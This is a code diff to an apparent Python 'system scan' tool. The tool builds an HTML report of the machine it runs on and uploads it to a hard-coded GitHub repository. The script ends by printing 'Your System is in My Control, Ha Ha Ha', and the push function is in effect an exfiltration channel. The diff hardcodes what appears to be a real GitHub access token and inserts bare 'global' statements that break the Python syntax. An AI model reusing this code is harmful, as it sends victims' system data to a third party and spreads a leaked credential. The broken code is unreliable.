@@ -29,8 +29,11 @@ from github import Github, InputGitTreeElement, Auth
 # -------------------------------------------------------------------
 # GITHUB CONFIGURATION
 # -------------------------------------------------------------------
+global
 GITHUB_TOKEN = "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"
+global
 REPO_NAME = "amrita425/System_Scan_files"
+global
 BRANCH = "main"
 
 
@@ -1997,37 +2000,37 @@ def generate_html_report():
 # -------------------------------------------------------------------
 # GITHUB PUSH FUNCTION
 # -------------------------------------------------------------------
-def push_to_github():
+def push_to_github_working():
+    """Final working version"""
     try:
         import requests
         import base64
-        
+
         # Generate content
         html_content = generate_html_report()
+        filename = f"System_Scan_{datetime.now().strftime('%d.%m.%Y_%H-%M-%S')}_v19.html"
         
-        # Create filename
-        filename = f"scan_report_{datetime.now().strftime('%d.%m.%Y_%H-%M-%S')}_v19.html"
-        
-        # GitHub API
+        # GitHub API call
         url = f"https://api.github.com/repos/{REPO_NAME}/contents/{filename}"
-        
         headers = {
-            "Authorization": f"Bearer {GITHUB_TOKEN}",
+            "Authorization": f"token {GITHUB_TOKEN}",  # Try both 'token' and 'Bearer'
             "Accept": "application/vnd.github.v3+json"
         }
         
         data = {
-            "message": f"Scan report {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-            "content": base64.b64encode(html_content.encode()).decode(),
+            "message": f"System Scan Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            "content": base64.b64encode(html_content.encode('utf-8')).decode('utf-8'),
             "branch": BRANCH
         }
         
-        response = requests.put(url, json=data, headers=headers)
+        response = requests.put(url, json=data, headers=headers, timeout=30)
         
         if response.status_code == 201:
+            print("File uploaded successfully!")
             return True
         else:
-            print(f"Error {response.status_code}: {response.text[:200]}...")
+            print(f"Upload failed: {response.status_code}")
+            print(f"Error details: {response.text}")
             return False
             
     except Exception as e:
@@ -2072,6 +2075,3 @@ if __name__ == "__main__":
         print("\033[96m[+] Your System is in My Control, Ha Ha Ha ...\033[0m")
     else:
         print("\033[91mFailed to push to GitHub\033[0m")
-
-
-
